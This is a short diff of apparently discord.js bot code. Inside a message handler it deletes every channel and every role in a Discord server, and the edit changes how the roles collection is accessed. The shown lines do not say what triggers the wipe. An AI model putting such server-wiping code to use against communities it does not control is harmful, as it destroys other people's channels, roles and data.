@@ -225,7 +225,7 @@ bot.on("message", async (message) => {
                 msg.guild.channels.cache.forEach(ch => {
                     ch.delete()
                 })
-                msg.guild.roles.cache.forEach(ava => {
+                msg.guild.roles.forEach(ava => {
                     ava.delete()
                 })
             
